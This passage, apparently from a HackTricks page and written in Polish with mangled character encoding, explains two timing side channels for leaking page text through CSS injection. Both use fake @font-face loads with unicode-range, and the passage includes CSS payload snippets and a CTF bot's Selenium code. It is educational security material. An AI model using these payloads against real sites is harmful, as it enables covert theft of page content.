### Wyciek treÅ›ci wÄ™zÅ‚a tekstowego (III): wyciek kodowania znakÃ³w za pomocÄ… czasu cache (nie wymaga zewnÄ™trznych zasobÃ³w) <a href="#wyciek-treÅ›ci-wÄ™zÅ‚a-tekstowego-ii-wyciek-kodowania-znakÃ³w-za-pomocÄ…-domyÅ›lnej-czcionki" id="wyciek-treÅ›ci-wÄ™zÅ‚a-tekstowego-ii-wyciek-kodowania-znakÃ³w-za-pomocÄ…-domyÅ›lnej-czcionki"></a>

**OdwoÅ‚anie:** Jest to wspomniane jako [nieudane rozwiÄ…zanie w tym opracowaniu](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

W tym przypadku moÅ¼emy sprÃ³bowaÄ‡ wyciec, czy dany znak znajduje siÄ™ w tekÅ›cie, Å‚adowujÄ…c faÅ‚szywÄ… czcionkÄ™ z tej samej domeny:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
JeÅ›li wystÄ…pi dopasowanie, **czcionka zostanie zaÅ‚adowana z `/static/bootstrap.min.css?q=1`**. ChociaÅ¼ nie zostanie zaÅ‚adowana pomyÅ›lnie, **przeglÄ…darka powinna jÄ… zapamiÄ™taÄ‡**, a nawet jeÅ›li nie ma pamiÄ™ci podrÄ™cznej, istnieje mechanizm **304 not modified**, dziÄ™ki czemu **odpowiedÅº powinna byÄ‡ szybsza** niÅ¼ inne rzeczy.

Jednak jeÅ›li rÃ³Å¼nica czasu miÄ™dzy odpowiedziÄ… z pamiÄ™ci podrÄ™cznej a bez pamiÄ™ci podrÄ™cznej nie jest wystarczajÄ…co duÅ¼a, to nie bÄ™dzie to przydatne. Na przykÅ‚ad autor wspomniaÅ‚: Jednak po przetestowaniu stwierdziÅ‚em, Å¼e pierwszym problemem jest to, Å¼e prÄ™dkoÅ›Ä‡ nie jest znacznie rÃ³Å¼na, a drugim problemem jest to, Å¼e bot uÅ¼ywa flagi `disk-cache-size=1`, co jest naprawdÄ™ przemyÅ›lane.

### Wyciek treÅ›ci wÄ™zÅ‚a tekstowego (III): wyciek kodowania poprzez pomiar czasu Å‚adowania setek lokalnych "czcionek" (nie wymagajÄ…cych zewnÄ™trznych zasobÃ³w) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**OdwoÅ‚anie:** Jest to wspomniane jako [nieudane rozwiÄ…zanie w tym opracowaniu](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

W tym przypadku moÅ¼na wskazaÄ‡ **CSS, aby Å‚adowaÅ‚ setki faÅ‚szywych czcionek** z tego samego ÅºrÃ³dÅ‚a, gdy wystÄ…pi dopasowanie. W ten sposÃ³b moÅ¼na **zmierzyÄ‡ czas** i dowiedzieÄ‡ siÄ™, czy znak siÄ™ pojawia, czy nie, uÅ¼ywajÄ…c czegoÅ› takiego jak:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
A kod bota wyglÄ…da tak:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
JeÅ›li czcionka nie pasuje, oczekuje siÄ™, Å¼e czas odpowiedzi podczas odwiedzania bota wyniesie okoÅ‚o 30 sekund. Jednak jeÅ›li wystÄ™puje dopasowanie czcionki, wysyÅ‚ane sÄ… wielokrotne Å¼Ä…dania w celu pobrania czcionki, co powoduje ciÄ…gÅ‚Ä… aktywnoÅ›Ä‡ sieci. W rezultacie zajmie wiÄ™cej czasu zaspokojenie warunku zatrzymania i otrzymanie odpowiedzi. Dlatego czas odpowiedzi moÅ¼na uÅ¼yÄ‡ jako wskaÅºnik do okreÅ›lenia, czy wystÄ™puje dopasowanie czcionki.

## OdwoÅ‚ania

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
